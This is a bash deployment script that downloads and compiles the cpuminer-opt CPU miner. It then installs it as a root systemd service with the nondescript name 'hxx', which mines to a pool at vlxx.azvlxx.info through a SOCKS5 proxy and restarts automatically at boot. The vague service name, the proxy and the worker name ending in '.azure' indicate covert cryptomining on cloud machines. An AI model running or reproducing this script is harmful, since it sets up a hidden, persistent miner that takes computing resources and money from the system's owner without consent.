#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
tar xvzf v3.8.3.1.tar.gz &&
cd cpuminer-opt-3.8.3.1 &&
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
make &&
bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
[Unit]
Description=hxx
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpuminer -a lyra2z330 -o stratum+tcp://vlxx.azvlxx.info:3032 -u huynhnham0107.azure -p x -x socks5://vlxx.ezporn.info:18079
WatchdogSec=3200
Restart=always
RestartSec=120
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable hxx.service &&
service hxx start
                                  
